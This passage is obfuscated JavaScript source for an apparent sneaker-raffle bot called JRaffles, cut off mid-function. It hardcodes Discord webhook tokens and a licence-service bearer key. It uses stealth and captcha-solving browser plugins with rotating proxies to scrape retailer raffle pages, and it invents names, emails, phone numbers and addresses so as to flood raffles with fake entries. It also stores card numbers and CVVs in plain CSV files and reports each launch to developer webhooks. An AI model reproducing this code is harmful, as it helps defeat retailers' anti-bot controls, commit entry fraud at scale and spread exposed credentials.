const { EmbedBuilder: _0x4105dd } = require('discord.js');
var _0x286815 = require('exe');
const { execFile: _0x54dc5a } = require('child_process'), _0x512dd9 = require('puppeteer-extra'), _0x34cad3 = require('puppeteer-extra-plugin-recaptcha'), _0x5de1d3 = require('puppeteer-extra-plugin-stealth'), _0x191fc2 = require('chalk'), _0x2164fd = require('node-bash-title'), _0x71872f = require('fs'), _0x228309 = require('axios'), _0x394747 = require('papaparse');
var _0x1fe736 = require('random-name');
const _0x331b3f = require('request');
var _0x5d9e09 = require('prompt');
const _0xf73368 = _0x331b3f['jar']();
var _0x5a0dc7 = {};
const _0x31bff0 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x27e009 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x1e6532 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0xaaad27 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x37e6a3 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x269c9e = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x6600ee = 'https://discord.com/api/webhooks/', _0x4484cd = '' + _0x6600ee + _0x1e6532, _0x14fa11 = '' + _0x6600ee + _0xaaad27, _0x565446 = '' + _0x6600ee + _0x31bff0, _0x227865 = '' + _0x6600ee + _0x27e009, _0xcaa949 = '' + _0x6600ee + _0x37e6a3, _0x29cd31 = '' + _0x6600ee + _0x269c9e;
const _0xe19360 = JSON['parse'](_0x71872f['readFileSync']('../package.json', 'utf-8')), _0x2071e6 = _0xe19360['version'];
var _0x29ead8, _0x404517, _0x4c1e56, _0x532f70, _0x4f25ed, _0x338ac0, _0x1d42cd, _0x49aee2;
const _0x4987c4 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x1c9b1e = ![];
const _0x24beb0 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x2ced2e = '0123456789';
var _0x2c0d53 = _0x24beb0['split']('');
const _0x4ff6b9 = require('auto-git-update'), { PageEmittedEvents: _0x167d95 } = require('puppeteer'), { getRandomValues: _0x500a16 } = require('crypto'), { resolve: _0x1e148a } = require('path'), { Console: _0x108c6f } = require('console'), _0x498d76 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0xa84fcc = new _0x4ff6b9(_0x498d76);
async function _0xd175f0() {
    _0x4f25ed = _0x71872f['readdirSync']('../proxies'), _0x532f70 = _0x71872f['readdirSync']('../tasks'), !_0x71872f['existsSync']('../accounts/fenom.csv') && _0x71872f['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x71872f['existsSync']('../accounts/bstn.csv') && _0x71872f['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x71872f['existsSync']('../failed-tasks.csv') && _0x71872f['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x71872f['existsSync']('../successful-tasks.csv') && _0x71872f['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x5a0dc7 = JSON['parse'](_0x71872f['readFileSync']('../settings.json', 'utf-8')), !_0x5a0dc7['delay'] && (_0x5a0dc7['delay'] = 0x3c, _0x71872f['writeFileSync']('../settings.json', JSON['stringify'](_0x5a0dc7))), !_0x5a0dc7['captchaKey'] && (_0x5a0dc7['captchaKey'] = '', _0x71872f['writeFileSync']('../settings.json', JSON['stringify'](_0x5a0dc7))), !_0x5a0dc7['useRandomProxy'] && (_0x5a0dc7['useRandomProxy'] = !![], _0x71872f['writeFileSync']('../settings.json', JSON['stringify'](_0x5a0dc7))), !_0x5a0dc7['webhook'] && (_0x5a0dc7['webhook'] = '', _0x71872f['writeFileSync']('../settings.json', JSON['stringify'](_0x5a0dc7))), _0x5a0dc7['delay'] <= 0x1388 && (_0x5a0dc7['delay'] = _0x5a0dc7['delay'] * 0x3e8), _0x5a0dc7['MahaDelay'] = _0x5a0dc7['delay'], _0x6600ee = _0x5a0dc7['webhook'], _0x338ac0 = _0x5a0dc7['licenseKey'];
}
let _0x560e74, _0x4a3cb9 = [], _0x58284a;
const _0x207ff4 = _0x55b8aa => new Promise(_0x148c25 => setTimeout(_0x148c25, _0x55b8aa));
function _0x652d(_0x280b3b, _0x5dc238) {
    return Math['floor'](Math['random']() * (_0x5dc238 - _0x280b3b + 0x1) + _0x280b3b);
}
async function _0x1fd0af(_0xb7ef8f) {
    return _0x228309['get']('https://api.hyper.co/v4/licenses/' + _0xb7ef8f, { 'headers': { 'Authorization': 'Bearer\x20' + _0x4987c4 } })['then'](_0x45eee5 => _0x45eee5['data'])['catch'](() => null);
}
;
async function _0x55bb96(_0xdd619c) {
    console['clear']();
    if (_0xdd619c == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x460a2c = await _0x5d9e09['get']('License');
        if (_0x460a2c['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x207ff4(0xbb8), _0x55bb96(_0xdd619c);
        _0xdd619c = _0x460a2c['License'], _0x5a0dc7['licenseKey'] = _0xdd619c, _0x338ac0 = _0xdd619c, _0x71872f['writeFileSync']('../settings.json', JSON['stringify'](_0x5a0dc7));
    }
    console['log']('Checking\x20license\x20' + _0x338ac0 + '...'), await _0x207ff4(0x320);
    const _0x4b4087 = await _0x1fd0af(_0xdd619c);
    _0x1d42cd = JSON['stringify'](_0x4b4087['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x49aee2 = JSON['stringify'](_0x4b4087['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x4b4087)
        return console['log']('License\x20not\x20found');
    if (!_0x4b4087['user'])
        return console['log']('License\x20not\x20bound');
    return _0x4b4087['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x1c9b1e = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x1c9b1e = ![]);
}
async function _0x16197d() {
    var _0x4642b2 = await _0x5d9e09['get']('Module');
    return console['clear'](), _0x4642b2['Module'];
}
;
async function _0x42c9f2() {
    var _0x44748e = await _0x5d9e09['get']('Setting');
    return console['clear'](), _0x44748e['Setting'];
}
async function _0x6dea41() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x5e979 = 0x0; _0x5e979 < _0x532f70['length']; _0x5e979++) {
        console['log']('\x20(' + _0x5e979 + ')\x20' + _0x532f70[_0x5e979]);
    }
    console['log']('');
    var _0x335df7 = await _0x5d9e09['get']('Task');
    if (_0x335df7['Task'] > _0x532f70['length'] - 0x1 || isNaN(_0x335df7['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x207ff4(0x3e8), _0x6dea41();
    var _0x57d375 = _0x71872f['readFileSync']('../tasks/' + _0x532f70[_0x335df7['Task']], 'utf-8');
    return _0x4c1e56 = _0x394747['parse'](_0x57d375, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x191fc2['blue'](_0x532f70[_0x335df7['Task']])), _0x29ead8 = _0x532f70[_0x335df7['Task']], _0x4c1e56;
}
async function _0xd5e94a() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x1998ea = 0x0; _0x1998ea < _0x4f25ed['length']; _0x1998ea++) {
        console['log']('\x20(' + _0x1998ea + ')\x20' + _0x4f25ed[_0x1998ea]);
    }
    console['log']('');
    var _0x2e6196 = await _0x5d9e09['get']('Proxies');
    if (_0x2e6196['Proxies'] > _0x4f25ed['length'] - 0x1 || isNaN(_0x2e6196['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x207ff4(0x3e8), _0xd5e94a();
    var _0x327585 = _0x71872f['readFileSync']('../proxies/' + _0x4f25ed[_0x2e6196['Proxies']], 'utf-8')['split']('\x0a');
    let _0x30d394 = _0x327585['map']((_0x1581f3, _0x23add3) => {
        sanatizeProxy = _0x1581f3['replace']('\x0d', '');
        if (_0x327585[_0x23add3 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x404517 = _0x4f25ed[_0x2e6196['Proxies']], console['clear'](), _0x30d394;
}
async function _0x43c2cb() {
    var _0x353d1e = await _0x5d9e09['get']('Value');
    return console['clear'](), _0x353d1e['Value'];
}
async function _0x406fda(_0x4cafa5) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x33fe84 = 0x0; _0x33fe84 < _0x4cafa5['length']; _0x33fe84++) {
        console['log']('\x20(' + _0x33fe84 + ')\x20[' + _0x4cafa5[_0x33fe84]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x5ec8f8 = await _0x5d9e09['get']('Module');
    return _0x5ec8f8['Module'];
}
async function _0x584f53() {
    var _0x44ce5a = await _0x5d9e09['get']('Password');
    return console['clear'](), _0x44ce5a['Password'];
}
;
async function _0x141827() {
    var _0x393d59 = await _0x5d9e09['get']('Links');
    return _0x393d59['Links'];
}
;
async function _0x2c3db1() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x2ebff1 = 0x0; _0x2ebff1 < _0x4a3cb9['length']; _0x2ebff1++) {
        console['log']('\x20(' + _0x2ebff1 + ')\x20' + _0x4a3cb9[_0x2ebff1]);
    }
    ;
    console['log']();
    let _0xf44193 = await _0x5d9e09['get']('Product');
    return console['clear'](), _0xf44193['Product'];
}
;
function _0x13cc99() {
    var _0x4da61b = new Date(Date['now']())['toLocaleTimeString']();
    return _0x4da61b;
}
;
function _0x5a9399() {
    var _0x46f4b0 = new Date(Date['now']())['toLocaleString']();
    return _0x46f4b0['replace'](',', '');
}
async function _0xf7d9ce(_0x37785a, _0x4fddae) {
    let _0x135b65 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x2071e6 != 'devkey') {
        await _0x228309['post'](_0x37785a, _0x4fddae, _0x135b65);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x1653b0(_0x1766a6, _0x5adb18, _0xa1dc65, _0x133e3d, _0x35a8e2) {
    if (!_0x133e3d && _0xa1dc65 == 'dev') {
        var _0x1c0374 = new _0x4105dd()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x5adb18['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x5adb18['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x1766a6['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x5a0dc7['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x1d42cd,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x1766a6['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x2071e6,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x1c0374['data'];
    } else {
        if (_0x133e3d && _0xa1dc65 == 'dev') {
            var _0x1c0374 = new _0x4105dd()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x5adb18['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x1d42cd,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x5adb18['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x1766a6['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x5a0dc7['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x35a8e2,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x1766a6['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x2071e6,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x1c0374['data'];
        } else {
            if (_0xa1dc65 == 'pub') {
                var _0x1c0374 = new _0x4105dd()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x5adb18['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x5adb18['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x1766a6['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x5a0dc7['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x1766a6['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x2071e6,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x1c0374['data'];
            } else {
                if (_0xa1dc65 == 'acc' && !_0x133e3d) {
                    var _0x1c0374 = new _0x4105dd()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x5adb18['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x1d42cd,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x5adb18['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x5a0dc7['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x2071e6,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x1c0374['data'];
                } else {
                    if (_0xa1dc65 == 'acc' && _0x133e3d) {
                        var _0x1c0374 = new _0x4105dd()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x5adb18['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x1d42cd,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x35a8e2,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x5adb18['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x5a0dc7['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x2071e6,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x1c0374['data'];
                    } else {
                        if (_0xa1dc65 == 'open') {
                            var _0x1c0374 = new _0x4105dd()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x49aee2)['addFields']({
                                'name': 'User',
                                'value': '' + _0x1d42cd,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x2071e6,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x1c0374['data'];
                        } else {
                            if (!_0x133e3d && _0xa1dc65 == 'ver') {
                                var _0x1c0374 = new _0x4105dd()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x5adb18['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x1d42cd,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x5adb18['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x5a0dc7['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x2071e6,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x1c0374['data'];
                            } else {
                                if (_0x133e3d && _0xa1dc65 == 'ver') {
                                    var _0x1c0374 = new _0x4105dd()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x5adb18['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x1d42cd,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x35a8e2,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x5adb18['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x5a0dc7['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x2071e6,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x1c0374['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x5e3796(_0x1b07f5, _0x3a6105) {
    var _0x1d4820 = _0x1b07f5[_0x3a6105]['Address1']['split'](''), _0x193491 = _0x1b07f5[_0x3a6105]['Address2']['split'](''), _0x42c085 = _0x1b07f5[_0x3a6105]['Email']['split']('@');
    for (var _0x93e170 = 0x0; _0x93e170 < _0x1d4820['length']; _0x93e170++) {
        if (_0x1d4820[_0x93e170] == 'X') {
            var _0x38c31a = Math['round'](Math['random']() * (_0x24beb0['length'] - 0x1));
            _0x1d4820[_0x93e170] = _0x2c0d53[_0x38c31a];
        }
    }
    ;
    for (var _0x93e170 = 0x0; _0x93e170 < _0x193491['length']; _0x93e170++) {
        if (_0x193491[_0x93e170] == 'X') {
            var _0x38c31a = Math['round'](Math['random']() * (_0x24beb0['length'] - 0x1));
            _0x193491[_0x93e170] = _0x2c0d53[_0x38c31a];
        }
    }
    ;
    _0x1b07f5[_0x3a6105]['FirstName'] == 'RANDOM' && (_0x1b07f5[_0x3a6105]['FirstName'] = _0x1fe736['first']());
    _0x1b07f5[_0x3a6105]['LastName'] == 'RANDOM' && (_0x1b07f5[_0x3a6105]['LastName'] = _0x1fe736['last']());
    _0x42c085[0x0] == 'RANDOM' ? _0x42c085[0x0] = '' + _0x1fe736['first']() + _0x1fe736['last']() + _0x652d(0x1, 0x270f) + '@' : _0x42c085[0x0] = _0x42c085[0x0] + '@';
    _0x1b07f5[_0x3a6105]['Email'] = _0x42c085['join'](''), _0x1b07f5[_0x3a6105]['Address1'] = _0x1d4820['join'](''), _0x1b07f5[_0x3a6105]['Address2'] = _0x193491['join']('');
    _0x1b07f5[_0x3a6105]['Phone'] == 'RANDOM' && (_0x1b07f5[_0x3a6105]['Phone'] = '0' + _0x652d(0x5f5e100, 0x3b9ac9ff));
    if (_0x1b07f5[_0x3a6105]['Follower'] == 'RANDOM') {
        var _0x594573 = _0x652d(0x1, 0x270f);
        _0x1b07f5[_0x3a6105]['Follower'] = '' + _0x1fe736['first']() + _0x1fe736['last']() + _0x594573 + '\x20';
    }
    _0x1b07f5[_0x3a6105]['HouseNumber'] == 'RANDOM' && (_0x1b07f5[_0x3a6105]['HouseNumber'] = _0x652d(0x1, 0xc8));
    if (_0x1b07f5[_0x3a6105]['Address1'] == 'RANDOM') {
        var _0x595b88 = Math['round'](Math['random']() * (_0x24beb0['length'] - 0x1)), _0x2fc1d1 = _0x2c0d53[_0x595b88];
        _0x1b07f5[_0x3a6105]['Address1'] = _0x1fe736['last']() + 'straat', _0x1b07f5[_0x3a6105]['Zip'] == '' && (_0x1b07f5[_0x3a6105]['Postcode'] = _0x652d(0x3e8, 0x270f) + '\x20' + _0x2fc1d1 + _0x2fc1d1, _0x1b07f5[_0x3a6105]['Zip'] = _0x1b07f5[_0x3a6105]['Postcode']), _0x1b07f5[_0x3a6105]['HouseNumber'] = '' + _0x652d(0x1, 0xc8);
    }
    return;
}
;
async function _0x3fbd0e(_0x369643, _0x7a6f99) {
    _0x71872f['appendFileSync']('../failed-tasks.csv', _0x5a9399() + ',' + _0x7a6f99['store'] + ',' + _0x7a6f99['name'] + ',' + _0x369643['Url'] + ',' + _0x369643['Size'] + ',' + _0x369643['Follower'] + ',' + _0x369643['FirstName'] + ',' + _0x369643['LastName'] + ',' + _0x369643['Address1'] + ',' + _0x369643['Address2'] + ',' + _0x369643['HouseNumber'] + ',' + _0x369643['Zip'] + ',' + _0x369643['City'] + ',' + _0x369643['State'] + ',' + _0x369643['Country'] + ',' + _0x369643['Phone'] + ',' + _0x369643['Email'] + ',' + _0x369643['Password'] + ',' + _0x369643['PaymentMethod'] + ',' + _0x369643['CardType'] + ',' + _0x369643['NameOnCard'] + ',' + _0x369643['CardNumber'] + ',' + _0x369643['ExpiryDate'] + ',' + _0x369643['CVV'] + ',' + _0x369643['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x40845b(_0x5bacc7, _0x37d5ae) {
    _0x71872f['appendFileSync']('../successful-tasks.csv', _0x5a9399() + ',' + _0x37d5ae['store'] + ',' + _0x37d5ae['name'] + ',' + _0x5bacc7['Url'] + ',' + _0x5bacc7['Size'] + ',' + _0x5bacc7['Follower'] + ',' + _0x5bacc7['FirstName'] + ',' + _0x5bacc7['LastName'] + ',' + _0x5bacc7['Address1'] + ',' + _0x5bacc7['Address2'] + ',' + _0x5bacc7['HouseNumber'] + ',' + _0x5bacc7['Zip'] + ',' + _0x5bacc7['City'] + ',' + _0x5bacc7['State'] + ',' + _0x5bacc7['Country'] + ',' + _0x5bacc7['Phone'] + ',' + _0x5bacc7['Email'] + ',' + _0x5bacc7['Password'] + ',' + _0x5bacc7['PaymentMethod'] + ',' + _0x5bacc7['CardType'] + ',' + _0x5bacc7['NameOnCard'] + ',' + _0x5bacc7['CardNumber'] + ',' + _0x5bacc7['ExpiryDate'] + ',' + _0x5bacc7['CVV'] + ',' + _0x5bacc7['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x32e18d() {
    let _0x32f13f = proxyFile['split']('\x0a'), _0x4207da = _0x32f13f['map']((_0x357dc0, _0x3a723e) => {
        sanatizeProxy = _0x357dc0['replace']('\x0d', '');
        if (_0x32f13f[_0x3a723e + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4207da;
}
;
async function _0x2e99ee(_0xeff77f) {
    var _0x219cdb = _0xeff77f[0x1]['split'](':');
    const _0x31aa40 = await _0x512dd9['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x219cdb[0x0] + ':' + _0x219cdb[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x57d1ff = await _0x31aa40['newPage']();
        await _0x57d1ff['authenticate']({
            'username': '' + _0x219cdb[0x2],
            'password': '' + _0x219cdb[0x3]
        }), console['log'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x57d1ff['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x57d1ff['setRequestInterception'](!![]), _0x57d1ff['on']('request', _0x1f455d => {
            _0x1f455d['resourceType']() === 'image' || _0x1f455d['resourceType']() === 'font' || _0x1f455d['resourceType']() === 'media' ? _0x1f455d['abort']() : _0x1f455d['continue']();
        }), await _0x57d1ff['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x57d1ff['waitForTimeout'](0xbb8), await _0x57d1ff['waitForSelector']('.product-card');
        const _0x5a027e = await _0x57d1ff['$$eval']('a.product-card', _0x1902d1 => {
            return _0x1902d1['map'](_0x1573c1 => _0x1573c1['href']);
        });
        return _0x4a3cb9 = _0x5a027e;
    } catch (_0x3e630b) {
        console['log']('\x20' + _0x3e630b);
    } finally {
        _0x31aa40['close'](), console['clear']();
    }
}
;
async function _0x163ab4(_0x29ae69, _0x1edf97, _0x475b44, _0x1fc15d, _0x55be9a) {
    _0x1edf97 != 'ver' && await _0x5e3796(_0x1fc15d, _0x29ae69);
    if (_0x5a0dc7['useRandomProxy'] = ![])
        var _0x2f50fd = _0x55be9a[_0x29ae69]['split'](':');
    else
        var _0x43198a = Math['round'](Math['random']() * (_0x55be9a['length'] - 0x1)), _0x2f50fd = _0x55be9a[_0x43198a]['split'](':');
    var _0x227216 = _0x475b44['data'];
    _0x1edf97 != 'ver' && (_0x227216['data']['attributes']['properties']['$first_name'] = '' + _0x1fc15d[_0x29ae69]['FirstName'], _0x227216['data']['attributes']['properties']['$last_name'] = '' + _0x1fc15d[_0x29ae69]['LastName'], _0x227216['data']['attributes']['properties']['$address1'] = _0x1fc15d[_0x29ae69]['Address1'] + '\x20' + _0x1fc15d[_0x29ae69]['HouseNumber'] + '\x20' + _0x1fc15d[_0x29ae69]['Address2'], _0x227216['data']['attributes']['properties']['$zip'] = '' + _0x1fc15d[_0x29ae69]['Zip'], _0x227216['data']['attributes']['properties']['$city'] = '' + _0x1fc15d[_0x29ae69]['City'], _0x227216['data']['attributes']['properties']['$country'] = '' + _0x1fc15d[_0x29ae69]['Country'], _0x227216['data']['attributes']['properties']['Size'] = '' + _0x1fc15d[_0x29ae69]['Size'], _0x227216['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x1fc15d[_0x29ae69]['Follower'], _0x1edf97 == 'exp' ? _0x227216['data']['attributes']['email'] = '' + _0x1fc15d[_0x29ae69]['FirstName'] + _0x1fc15d[_0x29ae69]['LastName'] + _0x5a0dc7['catchall'] : _0x227216['data']['attributes']['email'] = '' + _0x1fc15d[_0x29ae69]['Email']);
    var _0x264d1c = {
        'jar': _0xf73368,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x475b44['url'],
        'headers': _0x475b44['headers'],
        'body': JSON['stringify'](_0x227216),
        'proxy': 'http://' + _0x2f50fd[0x2] + ':' + _0x2f50fd[0x3] + '@' + _0x2f50fd[0x0] + ':' + _0x2f50fd[0x1]
    };
    return _0x1edf97 === 'ver' && (_0x264d1c['method'] = 'GET'), new Promise(function (_0x594de2, _0x5ef42f) {
        callback = async (_0x38ed29, _0x4b1e89, _0x5eb069) => {
            if (!_0x38ed29 && _0x4b1e89['statusCode'] == 0xca || !_0x38ed29 && _0x4b1e89['statusCode'] == 0xc8) {
                _0x594de2(console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x475b44['name'] + ']\x20Task\x20' + (_0x29ae69 + 0x1) + ':\x20Raffle\x20Entered!')));
